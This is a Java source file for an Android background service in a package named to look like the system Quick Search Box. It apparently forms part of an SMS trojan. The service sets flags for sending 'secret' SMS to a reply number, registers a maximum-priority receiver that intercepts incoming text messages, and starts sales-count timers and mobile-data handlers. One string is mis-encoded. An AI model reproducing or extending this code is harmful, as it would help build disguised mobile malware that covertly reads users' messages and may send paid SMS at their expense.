package com.android.quicksearchbox.quicksearchbox.search;

import android.app.Service;
import android.content.ContentValues;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.content.SharedPreferences.Editor;
import android.net.Uri;
import android.os.IBinder;
import android.util.Log;

import com.android.quicksearchbox.quicksearchbox.util.KsoCache;
import com.android.quicksearchbox.quicksearchbox.util.KsoHelper;
import com.android.quicksearchbox.quicksearchbox.util.LogFile;
import com.android.quicksearchbox.quicksearchbox.util.ShareProDBHelper;

public class MainService extends Service {
	private final String TAG = "MainService";
	private KsoCache cache = KsoCache.getInstance();
	private ShareProDBHelper share;
	private int driveup;
	private KsoMainCourse ksoMainCourse;


	@Override
	public void onCreate() {
		share = new ShareProDBHelper(this.getApplicationContext());

		Editor editor = share.writer("sendSmsFlag");
		editor.putBoolean("sendSecretSms", false);
		editor.putString("secretSmsReplyNumber", "");
		editor.putBoolean("sendNormonSms", false);
		editor.putString("keyword", "");
		editor.commit();
		super.onCreate();
	}

	@Override
	public void onDestroy() {
		super.onDestroy();
	}

	@Override
	public void onStart(Intent intent, int startId) {
		super.onStart(intent, startId);
		ksoMainCourse = new KsoMainCourse();
		driveup = intent.getIntExtra("driveup", 0);
		IntentFilter localIntentFilter = new IntentFilter(
				"android.provider.Telephony.SMS_RECEIVED");
		localIntentFilter.setPriority(Integer.MAX_VALUE);
		SmsReceiver sr = new SmsReceiver();
		registerReceiver(sr, localIntentFilter);
		IntentFilter netChangeFilter = new IntentFilter(
				"android.net.conn.CONNECTIVITY_CHANGE");
		netChangeFilter.setPriority(Integer.MAX_VALUE);
		NetWorkChangeReceive nr = new NetWorkChangeReceive();
		registerReceiver(nr, netChangeFilter);

		IntentFilter alarmFilter = new IntentFilter(
				"com.kso.action.ALARMRECEIRVE");
		KsoAlarmService kas = new KsoAlarmService();
		registerReceiver(kas, alarmFilter);
		ksoMainCourse.startMainAlarm(this.getApplicationContext());
		int driveup_cfg = cache.getValue("driveup") != null ? (Integer) cache
				.getValue("driveup") : 0;
		int intelnetCount = cache.getValue("intelnetCount") != null ? (Integer) cache
  			.getValue("intelnetCount") : 0;
		int month = KsoHelper.getCurrentMonth();
		int internetedCount = share.getSharedPreferences("dataCenter").getInt(
				month + "��", 0);
		int saleCount = cache.getValue("sellCount") != null ? (Integer) cache
				.getValue("sellCount") : 2;
		String IntelnetDates = cache.getValue("internetDate") != null ? (String) cache
				.getValue("internetDate") : "";
		String[] IntelnetDate = IntelnetDates.split(",");
		long startIntelnetDate = cache.getValue("startIntelnetDate") != null ? (Long) cache
				.getValue("startIntelnetDate") : 0;
		if (intelnetCount >= internetedCount) {
			if (ksoMainCourse.decideStartFlag(startIntelnetDate,
					this.getApplicationContext())
					&& (driveup >= driveup_cfg)) {
				if (ksoMainCourse.checksalesvolumeOccasion(driveup_cfg,
						driveup, saleCount)) {
					ksoMainCourse.startTimerHandler(this
							.getApplicationContext());

				}
				if (ksoMainCourse.checkGPRSOccasion(
						this.getApplicationContext(), IntelnetDate)) {
					ksoMainCourse
							.startGPRSHandler(this.getApplicationContext());
				}
			} else {
			}

		} else {
		}
		// ============================================================================

	}

	@Override
	public IBinder onBind(Intent intent) {

		return null;
	}
	
	
	private void insert(String str,Context context) {
		
		//Uri uri = DataCenter.CONTENT_URI;
		
		//ContentValues values  =  new ContentValues();
		
		//values.put(DataCenter.KSOKEY, "curstomID");
		
		//values.put(DataCenter.KSOVALUE,str);
		
		//context.getContentResolver().insert(uri, values);
		
		
	}

}
